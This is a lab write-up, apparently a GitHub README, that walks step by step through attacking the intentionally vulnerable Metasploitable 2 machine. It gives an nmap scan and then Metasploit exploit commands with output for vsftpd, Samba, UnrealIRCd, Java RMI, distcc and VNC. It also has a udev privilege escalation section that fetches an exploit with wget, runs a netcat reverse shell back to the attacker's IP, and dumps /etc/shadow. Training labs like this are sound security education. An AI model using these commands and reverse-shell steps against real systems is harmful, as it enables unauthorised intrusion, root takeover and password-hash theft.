# Privilege Escalation on Metasploitable 2 
# Here is the nmap scanning of my m2 
```bash

──(durjoy㉿Kali)-[~]
└─$ sudo nmap -p- 172.16.6.128 -sV                   

[sudo] password for durjoy: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-03 12:01 +06
Nmap scan report for 172.16.6.128
Host is up (0.0013s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33884/tcp open  mountd      1-3 (RPC #100005)
33965/tcp open  status      1 (RPC #100024)
45783/tcp open  nlockmgr    1-4 (RPC #100021)
51360/tcp open  java-rmi    GNU Classpath grmiregistry
MAC Address: 00:0C:29:0E:61:63 (VMware)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.35 seconds


```

# 1. VSFTPD 2.3.4 Backdoor Exploitation
- **Service**: FTP (vsftpd 2.3.4) on port 21  
- **Exploit Module**: `exploit/unix/ftp/vsftpd_234_backdoor`  

### Commands & Output:
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.6.128
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 172.16.6.128:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.6.128:21 - USER: 331 Please specify the password.
[+] 172.16.6.128:21 - Backdoor service spawned
[+] 172.16.6.128:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
whoami
root
```

---

# 2. Samba usermap_script Exploitation
- **Service**: Samba (netbios-ssn) on ports 139/445  
- **Exploit Module**: `exploit/multi/samba/usermap_script`  

### Commands & Output:
```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.16.6.128
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.92.12
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler
[*] Command shell session 1 opened
whoami
root
```

---

# 3. UnrealIRCd Backdoor Exploitation
- **Service**: IRC (UnrealIRCd) on port 6667  
- **Exploit Module**: `exploit/unix/irc/unreal_ircd_3281_backdoor`  

### Commands & Output:
```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 172.16.6.128
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] 172.16.6.128:6667 - Connected
[*] Sending backdoor command...
[*] Command shell session 1 opened
whoami
root
```

---

# 4. Java RMI Server Exploitation
- **Service**: Java RMI on port 1099  
- **Exploit Module**: `exploit/multi/misc/java_rmi_server`  

### Commands & Output:
```bash
msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 172.16.6.128
msf6 exploit(multi/misc/java_rmi_server) > set payload generic/shell_reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) > set LHOST 192.168.92.12
msf6 exploit(multi/misc/java_rmi_server) > run
[*] Started reverse TCP handler
[*] Server started
[*] Sending RMI Header...
[*] Sending RMI Call...
[*] Command shell session 1 opened
whoami
root
---


```


# 5.  DistCC & udev Exploit

## Terminal Tab 1: Reconnaissance & Initial Exploit

### Nmap Scan (Discover vulnerable services):
```bash
sudo nmap -sV -p 3632 --script vuln 172.16.6.128
```
Found distccd (v1) vulnerable to CVE-2004-2687 (command execution).

### Metasploit Exploitation (Gain initial shell as daemon):
```bash
msfconsole -q
use exploit/unix/misc/distcc_exec
set RHOSTS 172.16.6.128
set payload cmd/unix/reverse
run
```
**Result:** Shell as daemon user.

### Post-Exploration (Check user/processes):
```bash
whoami             # daemon
cat /etc/passwd    # List users
ps aux            # Check running processes
```

## Terminal Tab 2: Privilege Escalation Setup

### Host Exploit (Prepare udev exploit):
Used searchsploit to find udev exploits:
```bash
searchsploit udev
```
Chose `8572.c` (Linux Kernel 2.6 UDEV < 1.4.1 exploit).

### Transfer Exploit to Target:
Started Apache to host the exploit:
```bash
sudo systemctl start apache2
```
On victim (via Tab 1 shell):
```bash
wget http://192.168.92.12/test/8572.c -O /tmp/8572.c
cd /tmp
gcc 8572.c -o ud  # Compile exploit
```

### Prepare Netcat Listener (For root shell):
```bash
nc -lvp 2309
```

## Terminal Tab 3: Privilege Escalation Execution

### Trigger Exploit (From Tab 1 shell):
Create a malicious script (`/tmp/run`):
```bash
echo "#!/bin/sh" > /tmp/run
echo "/bin/netcat -e /bin/sh 192.168.92.12 2309" >> /tmp/run
chmod +x /tmp/run
```

### Find udevd PID:
```bash
cat /proc/net/netlink  # Note PID (e.g., 2750)
```

### Execute exploit:
```bash
./ud 2750
```

### Root Shell Obtained (In Tab 3):
Netcat listener catches root shell:
```bash
whoami    # root
cat /etc/shadow  # Dump password hashes
```




# 6. VNC Exploit 
```bash
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 172.16.6.128
RHOSTS => 172.16.6.128
msf6 auxiliary(scanner/vnc/vnc_login) > set RPORT 5900
RPORT => 5900
msf6 auxiliary(scanner/vnc/vnc_login) > run
[*] 172.16.6.128:5900     - 172.16.6.128:5900 - Starting VNC login sweep
[!] 172.16.6.128:5900     - No active DB -- Credential data will not be saved!
[+] 172.16.6.128:5900     - 172.16.6.128:5900 - Login Successful: :password
[*] 172.16.6.128:5900     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/vnc/vnc_login) > 

```
### Now for get into the target machine -->

```bash
┌──(durjoy㉿Kali)-[~]
└─$ vncviewer 172.16.6.128:5900

Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (metasploitable:0)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
```
![image](https://github.com/user-attachments/assets/2360319a-be04-4619-8767-ed99180a5dd9)

